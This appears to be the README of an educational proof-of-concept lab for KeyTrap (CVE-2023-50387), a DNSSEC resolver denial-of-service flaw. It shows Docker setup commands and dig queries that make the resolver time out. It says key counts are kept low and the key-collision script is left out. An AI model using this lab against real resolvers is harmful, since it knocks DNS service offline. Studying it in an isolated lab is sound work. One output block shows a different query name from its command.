# CVE-2023-50387
KeyTrap in DNS (CVE-2023-50387)

This repository is for educational purposes.
The number of keys and signatures has been intentionally kept low to prevent their use in actual attacks, and a script for generating colliding keys are not included.

## Test

![network](imgs/network.png)

### Setting up the PoC environment

```
$ docker compose up --build
```

### Confirming DNSSEC works

```
$ docker compose exec -it attacker dig @10.10.0.3 a.a.test

; <<>> DiG 9.18.24 <<>> @10.10.0.3 a.a.test
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 44249
;; flags: qr rd ra ad; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
;; QUESTION SECTION:
;a.a.test.                      IN      A

;; ANSWER SECTION:
a.a.test.               86400   IN      A       10.10.0.4

;; Query time: 30 msec
;; SERVER: 10.10.0.3#53(10.10.0.3) (UDP)
;; WHEN: Sun Feb 18 22:01:01 UTC 2024
;; MSG SIZE  rcvd: 53
```

### Triggering KeyTrap

```sh
$ docker compose exec -it attacker dig @10.10.0.3 www.a.test
;; communications error to 10.10.0.3#53: timed out
;; communications error to 10.10.0.3#53: timed out
;; communications error to 10.10.0.3#53: timed out

; <<>> DiG 9.18.24 <<>> @10.10.0.3 www.a.test
; (1 server found)
;; global options: +cmd
;; no servers could be reached
```

```sh
$ docker compose exec -it attacker dig @10.10.0.3 b.a.test
;; communications error to 10.10.0.3#53: timed out
;; communications error to 10.10.0.3#53: timed out
;; communications error to 10.10.0.3#53: timed out

; <<>> DiG 9.18.24 <<>> @10.10.0.3 a.a.test
; (1 server found)
;; global options: +cmd
;; no servers could be reached
```

## References
- https://www.athene-center.de/en/keytrap
